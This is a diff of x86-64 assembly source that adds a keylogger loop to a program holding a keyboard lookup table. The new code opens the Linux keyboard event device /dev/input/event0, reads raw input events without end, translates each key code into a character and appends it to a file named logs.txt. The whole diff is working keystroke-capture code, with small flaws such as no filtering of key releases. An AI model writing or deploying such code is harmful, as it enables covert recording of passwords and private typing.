@@ -1,8 +1,6 @@
 .section .rodata
 # Table of the keyboard
-keys:
-    .fill 256, 1, 0
-    
+keys:    
     #Escape key
     .org keys+1
     .byte 0x1B
@@ -177,7 +175,8 @@ keys:
 
 .section .data
     file: .string "/dev/input/event0"
-
+    logs: .string "logs.txt"
+    test: .string "HHH"
     buffer: .skip 256, 0
 
 .section .text
@@ -188,17 +187,54 @@ main:
     # Enter
     pushq %rbp
     movq %rsp, %rbp  
+    pushq %r15
+    pushq %r14
 
     # open the event0 file
     movq $2, %rax
     movq $file, %rdi
-    movq $0400, %rsi
+    movq $0, %rsi
+    movq $0x800, %rdx
     syscall
+    movq %rax, %r15
 
-    pushq %rax  #save the file descriptor in the stack
+    movq $2, %rax
+    movq $logs, %rdi
+    movq $65, %rsi
+    movq $0400, %rdx
+    syscall
+    movq %rax, %r14
 
+    mainLoop:
+        # read from the event0 file
+        movq $0, %rax
+        movq %r15, %rdi
+        movq $buffer, %rsi
+        movq $24, %rdx
+        syscall
+
+        # get the right keyboard key
+        movq $buffer, %rsi
+        addq $18, %rsi
+        movzbq (%rsi), %rsi
+        addq $keys, %rsi
+
+        cmpq $0x0, (%rsi)
+        je mainLoop
+
+        # write in the logs file
+        movq $1, %rax
+        movq %r14, %rdi
+        movq $1, %rdx
+        syscall
+
+        jmp mainLoop
+
+    popq %r14
+    popq %r15
     movq %rbp, %rsp
     popq %rbp
     
     movq $60, %rax
+    xorq %rdi, %rdi
     syscall
